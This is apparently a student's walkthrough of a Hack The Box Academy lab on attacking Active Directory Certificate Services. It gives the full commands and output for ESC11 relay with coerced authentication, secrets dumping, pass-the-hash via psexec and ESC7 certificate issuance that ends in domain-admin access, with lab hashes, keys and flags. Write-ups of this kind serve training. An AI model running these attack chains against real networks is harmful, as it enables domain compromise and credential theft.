The SkillsAssestment lab involves 3 different flag to be found in the environment subnet of `172.16.19.0/24`.

## Initial Enumeration
Upon running NMAP seems like the alive hosts are:
172.16.19.3 = *lab-dc.lab.local* aka DC
172.16.19.5 = *WS01.lab.local* aka lab-WS01-CA
172.16.19.77 = *DEV01.lab.local*

If we run Ceripy to footprint the CA we ca get the following response.
```
certipy find -u 'tom' -p 'tom123' -dc-ip 172.16.19.3 -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'lab-WS01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'lab-WS01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'lab-WS01-CA' via RRP
[*] Got CA configuration for 'lab-WS01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : lab-WS01-CA
    DNS Name                            : WS01.lab.local
    Certificate Subject                 : CN=lab-WS01-CA, DC=lab, DC=local
    Certificate Serial Number           : 238F549429FFF796430B5F486159490B
    Certificate Validity Start          : 2023-07-06 09:44:47+00:00
    Certificate Validity End            : 2122-07-06 09:54:47+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
    Permissions
      Owner                             : LAB.LOCAL\Administrators
      Access Rights
        Enroll                          : LAB.LOCAL\Authenticated Users
                                          LAB.LOCAL\src_management
        ManageCertificates              : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
                                          LAB.LOCAL\src_management
        ManageCa                        : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
Certificate Templates                   : [!] Could not find any certificate templates
```
We know so far:
```
    CA Name                             : lab-WS01-CA
    DNS Name                            : WS01.lab.local
```
And that the CA is vulnerable to both ESC8 and 11. We can also see that the *Certifry patch* has been installed.
```
certipy req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-WS01-CA -dc-ip 172.16.19.3 -template User
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Failed to get dynamic TCP endpoint for CertSvc
[-] Got error: 'NoneType' object has no attribute 'request'
[-] Use -debug to print a stacktrace
```

## Preface
I will setup a dynamic port forwarder via proxychains4 and ssh so I can send commands directly from my machine.
```
sshpass -p 'HTB_@cademy_stdnt!' ssh -N -f -D 127.0.0.1:9050 htb-student@10.129.31.220
```
Now I should be able to snapshot the AD schema for analysys in Bloodhound for Certipy.
```
└─# proxychains4 bloodhound-python -d lab.local -ns 172.16.19.3 -c All -u tom -p tom123 --zip --dns-tcp
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: lab-dc.lab.local
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  lab-dc.lab.local:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.19.3:389  ...  OK
INFO: Found 6 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 
```


## Attacking the Environment
Now it is clear that at this stage we must first get to the DEV01 machine and afterwards we will be able to move forward as we don't have that must space as Tom user.
I will try to use the ESC11 attack to gain access as the DEV01 machine and from there move forward with the credentials I will find in that machine hopefully.
- I setup a relay via Certipy on the given SSH machine listening on the CA IP:
```
sudo certipy relay -target "rpc://172.16.19.5" -ca "lab-WS01-CA" -template DomainController
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting rpc://172.16.19.5 (ESC11)
[*] Listening on 0.0.0.0:445
```
- Next I execute a authentication coercion from another shell session on the given pivoting machine which will point back to our listening machine(.19) and will target the DEV01(.77):
```
coercer coerce -l 172.16.19.19 -t 172.16.19.77 -u tom -p 'tom123' -d lab.local -v
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[info] Starting coerce mode
[info] Scanning target 172.16.19.77
[*] DCERPC portmapper discovered ports: 49664,49665,49666,49667,49668,49669,49670,49671,49672
[+] Coercing '172.16.19.77' to authenticate to '172.16.19.19'
[+] DCERPC port '49669' is accessible!
   [+] Successful bind to interface (12345678-1234-ABCD-EF00-0123456789AB, 1.0)!
      [>] (-testing-) MS-RPRN──>RpcRemoteFindFirstPrinterChangeN      [!] (NO_AUTH_RECEIVED) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotification(pszLocalMachine='\\172.16.19.19\x00') 
Continue (C) | Skip this function (S) | Stop exploitation (X) ? c
      [>] (-testing-) MS-RPRN──>RpcRemoteFindFirstPrinterChangeN      [!] (RPC_S_ACCESS_DENIED) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotificationEx(pszLocalMachine='\\172.16.19.19\x00') 
Continue (C) | Skip this function (S) | Stop exploitation (X) ?
```
- And after just a couple of seconds we have a callback!
```
[*] Connecting to ncacn_ip_tcp:172.16.19.5[135] to determine ICPR stringbinding
[*] Attacking user 'DEV01$@DC'
[*] Requesting certificate for user 'DEV01$' with template 'DomainController'
[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 18
Would you like to save the private key? (y/N) y
[*] Saved private key to 18.key
[-] Failed to request certificate
[*] Exiting...
```
Now it is clear that the certificate template we are using is not the right one as we are not targeting a DC but a webserver so we need to find a valid template that:
- Is Active?
- Can be used for client authentication?
- Can be used enrolled by domain users?
And my choice falls to "Machine" Template which seems covering all the requisites?
```
20
    Template Name                       : Machine
    Display Name                        : Computer
    Certificate Authorities             : lab-WS01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDnsAsCn
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Private Key Flag                    : AttestNone
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Computers
                                          LAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : LAB.LOCAL\Enterprise Admins
        Write Owner Principals          : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Write Dacl Principals           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Write Property Principals       : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins

```
- Now we have a valid pfx that can be used to perform a client authentication.
```
sudo certipy relay -target "rpc://172.16.19.5" -ca "lab-WS01-CA" -template Machine
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting rpc://172.16.19.5 (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:172.16.19.5[135] to determine ICPR stringbinding
[*] Attacking user 'DEV01$@DC'
[*] Requesting certificate for user 'DEV01$' with template 'Machine'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 19
[*] Got certificate with DNS Host Name 'DEV01.lab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'dev01.pfx'
[*] Exiting...
```
- Now this pfx should ber used to get a valid TGT:
```
certipy auth -pfx dev01.pfx 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: dev01$@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'dev01.ccache'
[*] Trying to retrieve NT hash for 'dev01$'
[*] Got hash for 'dev01$@lab.local': aad3b435b51404eeaad3b435b51404ee:3258c4c84251c7b41b4c7a70d254bc50
```
- Now we can use the ccache kerberos ticket to dump the secrets from the machine.
```
export KRB5CCNAME=./dev01.ccache 
root@ubuntu:/home/htb-student# klist

Command 'klist' not found, but can be installed with:

apt install heimdal-clients  # version 7.7.0+dfsg-1ubuntu1.4, or
apt install krb5-user        # version 1.17-6ubuntu4.3

root@ubuntu:/home/htb-student#  secretsdump.py -k -no-pass dev01.lab.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf8fac0c45a88516e4ae0bf03171c5ac3
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:80d60bc9c2d2a9af65a02b86f258413b:::
--SNIP--:
[*] DefaultPassword 
DC\jimmy:jimmy_001
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x7e54aec58ae7244a349d3007ed61f38f300267b5
dpapi_userkey:0x38f65ac1a7e457208deb86193eca29f4038740e1
[*] NL$KM 
 0000   A2 52 9D 31 0B B7 1C 75  45 D6 4B 76 41 2D D3 21   .R.1...uE.KvA-.!
 0010   C6 5C DD 04 24 D3 07 FF  CA 5C F4 E5 A0 38 94 14   .\..$....\...8..
 0020   91 64 FA C7 91 D2 0E 02  7A D6 52 53 B4 F4 A9 6F   .d......z.RS...o
 0030   58 CA 76 00 DD 39 01 7D  C5 F7 8F 4B AB 1E DC 63   X.v..9.}...K...c
NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```
- Here can we see the answer of a flag(Jimmy's password) and we can use the local administrator's password hash to grab a flag on the DEV01 machine.
```
psexec.py -hashes :80d60bc9c2d2a9af65a02b86f258413b Administrator@dev01.lab.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on dev01.lab.local.....
[*] Found writable share ADMIN$
[*] Uploading file gUXlUQmj.exe
[*] Opening SVCManager on dev01.lab.local.....
[*] Creating service NnrT on dev01.lab.local.....
[*] Starting service NnrT.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Windows\system32> cd ..
C:\Windows> cd ..
--SNIP--
C:\Users\Administrator\Desktop> type flag.txt
HTB{C3r7IFic47e_F7W}
```
- Now the challenge asks us to target the DC and I guess we need to re-run a Certipy scan in order to see exacly what kind of permissions can Jimmy have on the domain?
- Now checking in Bloodhound seems like Jimmy is part of a custom AD group named SRC_Management, this group is part of the ManageCertificates:
```
      Access Rights
        Enroll                          : LAB.LOCAL\Authenticated Users
                                          LAB.LOCAL\src_management
        ManageCertificates              : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
                                          LAB.LOCAL\src_management
```
This means that he should be able to re-enroll possible certificates that fails to enroll.
-  We can re-run Certipy to check what can we exactly do?
```
└─# proxychains certipy-ad find -u 'Jimmy@lab.local' -p 'jimmy_001' -dc-ip 172.16.19.3 -stdout -vulnerable

[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : lab-WS01-CA
    DNS Name                            : WS01.lab.local
    Certificate Subject                 : CN=lab-WS01-CA, DC=lab, DC=local
    Certificate Serial Number           : 238F549429FFF796430B5F486159490B
    Certificate Validity Start          : 2023-07-06 09:44:47+00:00
    Certificate Validity End            : 2122-07-06 09:54:47+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
    Permissions
      Owner                             : LAB.LOCAL\Administrators
      Access Rights
        Enroll                          : LAB.LOCAL\Authenticated Users
                                          LAB.LOCAL\src_management
        ManageCertificates              : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
                                          LAB.LOCAL\src_management
        ManageCa                        : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
    [!] Vulnerabilities
      ESC7                              : 'LAB.LOCAL\\src_management' has dangerous permissions
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
Certificate Templates                   : [!] Could not find any certificate templates
```
As guessed seems like the attack is vulnerable to vector ESC7 which allows us to re-enroll issued certificates as we are part of *ManageCertificates* group.
- Now we need to identify a Template that can be used to perform **ClientAuthentication**, is **enabled** and it requires the **manager approval**. Even if it fails we will able to re-issue it! I see 1 candidate(VPN_Users).
```
# proxychains certipy-ad req -u 'Jimmy@lab.local' -p 'jimmy_001' -ca lab-WS01-CA -template VPN_Users -dc-ip 172.16.19.5 -upn Administrator
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.19.5:445  ...  OK
[!] Certificate request is pending approval
[*] Request ID is 28
Would you like to save the private key? (y/N) y
[*] Saved private key to 28.key
[-] Failed to request certificate
```
- It failed as expected but we can re-issue it with:
```
─# proxychains certipy-ad ca -u 'Jimmy@lab.local' -p 'jimmy_001' -ca lab-WS01-CA -issue-request 28 -dc-ip 172.16.19.5                
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.19.5:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.19.5:49732  ...  OK
[*] Successfully issued certificate
```
- And now retrieve from the CA:
```
└─# proxychains certipy-ad req -u 'Jimmy@lab.local' -p 'jimmy_001' -ca lab-WS01-CA -retrieve 28 -dc-ip 172.16.19.5    
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 28
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.19.5:445  ...  OK
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Loaded private key from '28.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
- Now ask for a TGT since the template can be used to perform a client authentication.
```
┌──(root㉿kali)-[/home/user/Downloads]
└─# proxychains certipy-ad auth -pfx administrator.pfx                                                                
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@lab.local
[*] Trying to get TGT...
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  lab.local:88  ...  OK
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  lab.local:88  ...  OK
[*] Got hash for 'administrator@lab.local': aad3b435b51404eeaad3b435b51404ee:61208396569628a7a987d1dadb7683bb
```
Now point to the ccache kerberos ticket and enjoy!
```
icrosoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> hostname
lab-dc

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
HTB{C0mprOm1s3d_D0ma1n}
C:\Windows\system32> 

```

